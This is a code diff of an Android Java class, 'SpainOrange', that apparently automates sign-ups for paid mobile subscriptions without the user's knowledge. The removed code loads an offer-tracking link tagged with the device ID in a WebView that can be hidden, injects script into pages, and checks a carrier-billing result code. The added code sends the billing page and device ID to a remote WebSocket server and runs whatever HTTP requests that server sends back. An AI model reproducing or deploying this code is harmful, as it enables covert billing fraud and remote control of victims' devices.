@@ -1,145 +1,125 @@
 package com.enhtmv.sublib.work.spain;
 
-import android.view.View;
-import android.webkit.JavascriptInterface;
-import android.webkit.WebChromeClient;
-import android.webkit.WebResourceRequest;
-import android.webkit.WebResourceResponse;
-import android.webkit.WebView;
-import android.webkit.WebViewClient;
-import android.widget.LinearLayout;
-import android.widget.RelativeLayout;
+import android.util.ArrayMap;
 
-import com.blankj.utilcode.util.ConvertUtils;
+import com.alibaba.fastjson.JSON;
 import com.blankj.utilcode.util.LogUtils;
-import com.blankj.utilcode.util.ResourceUtils;
-import com.blankj.utilcode.util.Utils;
-import com.cp.plugin.Plugin;
-import com.enhtmv.sublib.common.sub.WebViewSubCall;
+import com.enhtmv.sublib.common.http.SubResponse;
+import com.enhtmv.sublib.common.sub.SubCall;
 
-import java.io.InputStream;
-import java.lang.reflect.Method;
+import java.util.HashMap;
+import java.util.Map;
 
-import okhttp3.HttpUrl;
+import okhttp3.OkHttpClient;
+import okhttp3.Request;
+import okhttp3.Response;
+import okhttp3.WebSocket;
+import okhttp3.WebSocketListener;
 
-public class SpainOrange extends WebViewSubCall {
-
-
-    private String logFunc;
-
-    private String script;
+public class SpainOrange extends SubCall {
 
 
-    private RelativeLayout layout;
-
-    public SpainOrange(RelativeLayout layout) {
-        super(new WebView(Utils.getApp().getBaseContext()));
-
-        this.layout = layout;
-
-        webView.setWebChromeClient(new WebChromeClient());
-
-        webView.setWebViewClient(new WebViewClient() {
-            @Override
-            public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
-                view.loadUrl(request.getUrl().toString());
-                return true;
-            }
-
-            @Override
-            public void onPageFinished(WebView view, String url) {
-                super.onPageFinished(view, url);
-            }
-
-            @Override
-            public WebResourceResponse shouldInterceptRequest(WebView view, WebResourceRequest request) {
-
-                String url = request.getUrl().toString();
-
-                if (ignore(request)) {
-                    return new WebResourceResponse("", "", null);
-                }
-
-                if (url.startsWith("http://go-es.allcpx.com/web/sub/result")) {
-
-                    HttpUrl httpUrl = HttpUrl.parse(url);
-
-                    if (httpUrl != null) {
-                        String code = httpUrl.queryParameter("dcbErrorCode");
-
-                        if ("0".equals(code) || "150".equals(code)) {
-                            success();
-                        } else {
-                            r.w("error", url);
-                        }
-                    } else {
-                        r.w("error", url);
-                    }
-
-                }
+    private Map<String, String> header = new HashMap<>();
 
 
-                if (url.endsWith("jquery.min.js")) {
+    public SpainOrange() {
 
-                    String jquery = ResourceUtils.readAssets2String("jquery.js") + "\n"
-                            + logFunc + "\n"
-                            + script;
+        header.put("User-Agent", "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3329.0 Mobile Safari/537.36");
 
-                    InputStream inputStream = ConvertUtils.string2InputStream(jquery, "utf-8");
-
-                    return new WebResourceResponse("application/javascript; charset=utf-8", "utf-8", inputStream);
-
-                }
-
-                return super.shouldInterceptRequest(view, request);
-            }
-        });
+    }
 
 
-        for (Method method : JavascriptLog.class.getMethods()) {
-            JavascriptInterface annotation = method.getAnnotation(JavascriptInterface.class);
-            if (annotation != null) {
-                this.logFunc = "function log(tag,info){window.LOG." + method.getName() + "(tag,info)}";
-                LogUtils.i("script log method:", logFunc);
-                break;
-            }
-        }
+    @Override
+    public void onSub(String message) {
+
     }
 
     @Override
-    public void sub(String script) {
+    public void sub(String host) {
 
-        this.script = script;
 
-        handler.post(new Runnable() {
+        OkHttpClient client = new OkHttpClient.Builder().build();
+
+
+        //ws://10.0.2.2:8010/ws
+        final Request request = new Request.Builder().url(host).build();
+
+
+        client.newWebSocket(request, new WebSocketListener() {
             @Override
-            public void run() {
+            public void onOpen(WebSocket webSocket, Response response) {
+                super.onOpen(webSocket, response);
 
-                clearCookies();
-
-                LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.MATCH_PARENT);
-
-                webView.setLayoutParams(params);
-
-
-                if (Plugin.isHiden()) {
-                    webView.setVisibility(View.GONE);
-                }
-
-                layout.addView(webView);
-
-                webView.clearHistory();
-                webView.clearCache(true);
-                webView.clearFormData();
-
+                LogUtils.i("websocket open !");
 
                 report(SUB_REQEUST);
 
-                webView.loadUrl("http://offer.allcpx.com/offer/track?offer=271&clickId=" + androidId);
+                try {
+
+                    SubResponse s = http().get("http://offer.allcpx.com/offer/track?offer=271&clickId=" + androidId, header);
+
+                    if (s.response().code() == 200 && s.url().startsWith("http://enabler.dvbs.com/session/cardm/wap")) {
+
+                        Map<String, String> data = new ArrayMap<>();
+
+                        data.put("location", s.url());
+                        data.put("html", s.body());
+                        data.put("vid", androidId);
+
+                        webSocket.send(JSON.toJSONString(data));
+
+                        report("step1", s.url());
+
+                    } else {
+                        throw new Exception(response.toString());
+                    }
+
+                } catch (Exception e) {
+                    LogUtils.e(e);
+
+                    r.e("step1_error", e);
+                }
+
+            }
+
+
+            private int num = 1;
+
+            @Override
+            public void onMessage(WebSocket webSocket, String text) {
+                super.onMessage(webSocket, text);
+
+
+                num++;
+
+                try {
+                    RequestObj requestObj = JSON.parseObject(text, RequestObj.class);
+
+                    SubResponse response = requestObj.call(http());
+
+                    if (response.url().startsWith("https://www.google.com")) {
+
+                        r.w("step" + num, requestObj.getForm() + "\n" + response.flowUrls());
+                        return;
+                    }
+
+                    report("step" + num, response.toString());
+
+                } catch (Exception e) {
+                    LogUtils.e(e);
+                    r.e("step" + num + "_error", e);
+                }
+
+            }
+
+
+            @Override
+            public void onFailure(WebSocket webSocket, Throwable t, Response response) {
+                super.onFailure(webSocket, t, response);
+
+                LogUtils.e("websocket error", t);
             }
         });
 
     }
-
-
 }
